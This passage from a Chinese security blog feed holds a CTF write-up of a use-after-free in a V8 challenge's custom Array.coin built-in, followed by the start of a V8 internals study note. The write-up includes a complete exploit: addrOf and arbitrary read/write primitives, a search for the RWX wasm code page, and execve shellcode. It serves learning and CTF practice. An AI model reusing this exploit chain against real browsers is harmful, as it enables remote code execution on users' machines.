<p>继续运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x2bc94228bf99 &lt;JSArray[256]&gt;</span><br><span class="line">pwndbg&gt; job 0x2bc94228bf99</span><br><span class="line">0x2bc94228bf99: [JSArray]</span><br><span class="line"> - map: 0x0588c25c2f79 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x10fd0b1517a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2bc94228c0b9 &lt;FixedArray[256]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 256</span><br><span class="line"> - properties: 0x153d78680c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x367cbd5001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2bc94228c0b9 &lt;FixedArray[256]&gt; &#123;</span><br><span class="line">        0-18: 0x153d786805b1 &lt;the_hole&gt;</span><br><span class="line">          19: 1072693248</span><br><span class="line">      20-255: 0x153d786805b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/40gx 0x2bc94228c029-1</span><br><span class="line">0x2bc94228c028:	0x0000153d786807b1	0x0000001000000000</span><br><span class="line">0x2bc94228c038:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c048:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c058:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c068:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c078:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c088:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c098:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0a8:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0b8:	0x0000153d786807b1	0x0000010000000000</span><br><span class="line">0x2bc94228c0c8:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0d8:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0e8:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c0f8:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c108:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c118:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c128:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c138:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c148:	0x0000153d786805b1	0x0000153d786805b1</span><br><span class="line">0x2bc94228c158:	0x0000153d786805b1	0x3ff0000000000000</span><br></pre></td></tr></table></figure>

<p>可以发现，虽然array的地址没变，但是它的elements元素的地址发生变化了</p>
<p>但是，<code>elements.set(37, value-&gt;Numver())</code>依旧是将原来的地址的elements的第37个元素改变了，为什么呢？</p>
<p>原因在于，它取array和elements的时候，array的length还没有被改变，直到取length参数的时候调用了回调函数之后，array的空间才被重新alloc</p>
<p>但局部变量array和elements已经被赋值了，所以这就造成了uaf</p>
<h1 id="怎么利用呢？"><a href="#怎么利用呢？" class="headerlink" title="怎么利用呢？"></a>怎么利用呢？</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> len = &#123;</span><br><span class="line">    valueOf: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        victim = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">        %DebugPrint(victim);</span><br><span class="line">        %SystemBreak();</span><br><span class="line">        array.length = <span class="number">0x100</span>;</span><br><span class="line">        float_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x10</span>);</span><br><span class="line">        float_array[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array = [];</span><br><span class="line">array.length = <span class="number">34</span>;</span><br><span class="line">%DebugPrint(array);</span><br><span class="line">array.coin(len, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>gdb调试v8，断下来之后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x3e61bb0cc001  //array</span><br><span class="line">0x3e61bb0cc001: [JSArray]</span><br><span class="line"> - map: 0x2c4fad802f79 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2b74ba1d17a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3e61bb0cc091 &lt;FixedArray[34]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 34</span><br><span class="line"> - properties: 0x24d3fb1c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x250bb1c401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3e61bb0cc091 &lt;FixedArray[34]&gt; &#123;</span><br><span class="line">        0-33: 0x24d3fb1c05b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x3e61bb0cc1b1  //victim</span><br><span class="line">0x3e61bb0cc1b1: [JSArray]</span><br><span class="line"> - map: 0x2c4fad802f79 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2b74ba1d17a1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3e61bb0cc1e1 &lt;FixedArray[16]&gt; [HOLEY_SMI_ELEMENTS]</span><br><span class="line"> - length: 16</span><br><span class="line"> - properties: 0x24d3fb1c0c21 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x250bb1c401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3e61bb0cc1e1 &lt;FixedArray[16]&gt; &#123;</span><br><span class="line">        0-15: 0x24d3fb1c05b1 &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> pwndbg&gt; x/40gx 0x3e61bb0cc091-1</span><br><span class="line">0x3e61bb0cc090:	0x000024d3fb1c07b1	0x0000002200000000</span><br><span class="line">0x3e61bb0cc0a0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc0b0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc0c0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc0d0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc0e0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc0f0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc100:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc110:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc120:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc130:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc140:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc150:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc160:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc170:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc180:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc190:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc1a0:	0x000024d3fb1c05b1	0x000024d3fb1c05b1</span><br><span class="line">0x3e61bb0cc1b0:	0x00002c4fad802f79	0x000024d3fb1c0c21</span><br><span class="line">0x3e61bb0cc1c0:	0x00003e61bb0cc1e1	0x0000001000000000  //victim.length</span><br></pre></td></tr></table></figure>

<p>看到了，由于victim和array的elements的内存是挨着的，所以<code>array.coin</code>会改变victim的length。由于这并不是用代码那种方式赋值，而是以它非预期的方式赋值的，因此victim的elements并不会重新分配</p>
<p>注意，<code>%SystemBreak()</code>不能下到float_array之后，因为此时array的elements的空间已经被重新分配，此时断下打印出来的就是新的地址</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>利用方式就是通过float_array进行越界读写，修改一些对象的一些字段来达到利用的目的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="keyword">const</span> buf8 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf8);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf8);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">    f64[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(u32);</span><br><span class="line">    <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">    <span class="keyword">let</span> tmp = [];</span><br><span class="line">    tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">    tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">    u32.set(tmp);</span><br><span class="line">    <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> wasmImports = &#123;</span><br><span class="line">        env: &#123;</span><br><span class="line">            puts: <span class="function"><span class="keyword">function</span> <span class="title">puts</span> (<span class="params">index</span>) </span>&#123;</span><br><span class="line">                print(utf8ToString(h, index));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">137</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">        <span class="number">96</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">140</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">118</span>,<span class="number">4</span>,<span class="number">112</span>,<span class="number">117</span>,</span><br><span class="line">        <span class="number">116</span>,<span class="number">115</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">        <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">146</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,</span><br><span class="line">        <span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">141</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">        <span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">135</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">16</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">146</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">65</span>,<span class="number">16</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">87</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(buffer),wasmImports);</span><br><span class="line">    <span class="keyword">let</span> h = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(m.exports.memory.buffer);</span><br><span class="line">    <span class="keyword">return</span> m.exports.hello;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func = test();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">mark</span>:i2f(<span class="number">0xdeadbeef</span>), <span class="attr">a</span>:func,<span class="attr">b</span>:func,<span class="attr">c</span>:func&#125;;</span><br><span class="line"><span class="keyword">var</span> array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> len = &#123;</span><br><span class="line">    valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        array.length = <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xabcd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">array.coin(len, <span class="number">0xdead</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array_to_obj_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> array_to_buffer_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> d = f2i(float_array[i]);</span><br><span class="line">    <span class="keyword">if</span>(d == <span class="number">0xdeadbeef</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        array_to_obj_offset = i + <span class="number">1</span>;</span><br><span class="line">        print(<span class="string">"[+] find array_to_obj_offset "</span> + array_to_obj_offset.toString());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = array_to_obj_offset; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> d = f2i(float_array[i]);</span><br><span class="line">    <span class="keyword">if</span>(d == <span class="number">0x200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        array_to_buffer_offset = i + <span class="number">1</span>;</span><br><span class="line">        print(<span class="string">"[+] find array_to_buffer_offset "</span> + array_to_buffer_offset.toString());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj.a = val;</span><br><span class="line">    <span class="keyword">return</span> f2i(float_array[array_to_obj_offset]) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次使用read会遇到addr没办法写到float_array[array_to_buffer_offset]的问题</span></span><br><span class="line"><span class="comment">//因为中间的时候栈上有个地方本应该是地址，但是却不知为何变成了一个字节的数字</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print(<span class="string">"[+] read from "</span> + hex(addr));</span><br><span class="line">    float_array[array_to_buffer_offset] = i2f(addr);</span><br><span class="line">    <span class="keyword">return</span> f2i(dv.getFloat64(<span class="number">0</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print(<span class="string">"[+] write "</span> + hex(data) + <span class="string">" to "</span> + hex(addr))</span><br><span class="line">    float_array[array_to_buffer_offset] = i2f(addr + <span class="number">1</span>);</span><br><span class="line">    dv.setFloat64(<span class="number">0</span>, i2f(data), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从这开始，就是大佬的操作了</span></span><br><span class="line"><span class="keyword">var</span> wasm_code=f2i(float_array[array_to_obj_offset])<span class="number">-0x189</span>;</span><br><span class="line"></span><br><span class="line">float_array[array_to_buffer_offset]=i2f(wasm_code);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">40</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    tmp_addr=f2i(dv.getFloat64(i*<span class="number">8</span>, <span class="literal">true</span>));</span><br><span class="line">    print(hex(wasm_code));</span><br><span class="line">    <span class="keyword">if</span>(tmp_addr%<span class="number">0x1000</span>==<span class="number">0</span>&amp;&amp;tmp_addr/<span class="number">0x1000</span>&gt;<span class="number">0x1000</span>&amp;&amp;tmp_addr&amp;<span class="number">0xff0000</span>)&#123;</span><br><span class="line">        wasm_code=tmp_addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] wasm code address 0x"</span> + hex(wasm_code));</span><br><span class="line"></span><br><span class="line">float_array[array_to_buffer_offset]=i2f(wasm_code);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode = [<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">    <span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dv.setUint8(i, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func();</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题获取wasm的code的RWX地址并不好找，因为如果按照oob的那种方式查找的话，会不知道为什么就会在代码的不知道什么地方遇到非法地址。。</p>
<p>于是就参照着别人的代码写了这个，shellcode依旧和之前oob那道题的一样</p>
<p>随后再看看为啥会遇到这些问题</p>
]]></content>
      <categories>
        <category>browser</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>chrome</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>学习V8(1)</title>
    <url>/2019/10/23/%E5%AD%A6%E4%B9%A0V8-1/</url>
    <content><![CDATA[<p>从上次做starCTF的OOB之后，对v8有了非常浅显的认识，于是想回看一下数字经济线下的Chrome一题，却发现自己对于v8还是知之甚少，以至于看不懂exp</p>
<p>故，站在前人的肩膀上，学习一下v8</p>
<a id="more"></a>

<p>文章参考：</p>
<ul>
<li><a href="http://www.jayconrod.com/posts/51/a-tour-of-v8-full-compiler" target="_blank" rel="noopener">http://www.jayconrod.com/posts/51/a-tour-of-v8-full-compiler</a></li>
<li><a href="http://www.jayconrod.com/posts/54/a-tour-of-v8-crankshaft-the-optimizing-compiler" target="_blank" rel="noopener">http://www.jayconrod.com/posts/54/a-tour-of-v8-crankshaft-the-optimizing-compiler</a></li>
<li><a href="http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation" target="_blank" rel="noopener">http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation</a></li>
<li><a href="http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection" target="_blank" rel="noopener">http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection</a></li>
<li><a href="https://www.cnblogs.com/floatboy/p/v8.html" target="_blank" rel="noopener">https://www.cnblogs.com/floatboy/p/v8.html</a></li>
</ul>
<h1 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h1><p>v8有两个编译器，一个是Full Compiler， 一个是CRANKSHAFT Compiler</p>
<h2 id="FC"><a href="#FC" class="headerlink" title="FC"></a>FC</h2><p>Full Compiler的作用是尽快生成原生代码，以保持页面始终快速运转。它并不会把代码编译成为字节码，而是将其转换为IR</p>
<p>它使用内联缓存（Inline cache，IC）来实现读取、存储、函数调用、二元运算符、一元运算符、比较运算符以及ToBoolean隐操作符。目的是为了解决“一个简单的操作却有上百种运行时情况”的情况</p>
<h2 id="Crankshaft"><a href="#Crankshaft" class="headerlink" title="Crankshaft"></a>Crankshaft</h2><p>Crankshaft是v8的优化编译器。当FC产生的代码运行过一段时间之后，v8会挑选出那些被执行次数多的函数，重新使用Crankshaft来编译，使其执行效率提高</p>
<h1 id="对象表示"><a href="#对象表示" class="headerlink" title="对象表示"></a>对象表示</h1><p>直接在内存里看一下</p>
<p>用gdb运行d8后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">d8&gt;</span> var obj = &#123;a:1,b:2&#125;</span><br><span class="line">undefined</span><br><span class="line"><span class="meta">d8&gt;</span> %DebugPrint(obj)</span><br><span class="line">0x1b9ade54dd19 &lt;Object map = 0x13de2b94ab89&gt;</span><br><span class="line">&#123;a: 1, b: 2&#125;</span><br><span class="line"><span class="meta">d8&gt;</span> %SystemBreak()</span><br></pre></td></tr></table></figure>

<p>然后用job指令打印一下obj的结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x1b9ade54dd19</span><br><span class="line">0x1b9ade54dd19: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x13de2b94ab89 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x279242542091 &lt;Object map = 0x13de2b940229&gt;</span><br><span class="line"> - elements: 0x28b52d880c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x28b52d880c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #a: 1 (const data field 0)</span><br><span class="line">    #b: 2 (const data field 1)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>看一下prototype的结构，发现其中是许多函数，这或许是该对象支持的一些成员函数了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x279242542091</span><br><span class="line">0x279242542091: [JS_OBJECT_TYPE] in OldSpace</span><br><span class="line"> - map: 0x13de2b940229 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x28b52d8801d9 &lt;null&gt;</span><br><span class="line"> - elements: 0x28b52d880c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x279242542fb1 &lt;PropertyArray[9]&gt; &#123;</span><br><span class="line">    #constructor: 0x2792425420c9 &lt;JSFunction Object (sfi = 0xde2a0e457e9)&gt; (data field 0)</span><br><span class="line">    #__defineGetter__: 0x279242543191 &lt;JSFunction __defineGetter__ (sfi = 0xde2a0e460c9)&gt; (const data field 1)</span><br><span class="line">    #__defineSetter__: 0x2792425431c9 &lt;JSFunction __defineSetter__ (sfi = 0xde2a0e46121)&gt; (const data field 2)</span><br><span class="line">    #hasOwnProperty: 0x279242543201 &lt;JSFunction hasOwnProperty (sfi = 0xde2a0e46179)&gt; (const data field 3)</span><br><span class="line">    #__lookupGetter__: 0x279242543009 &lt;JSFunction 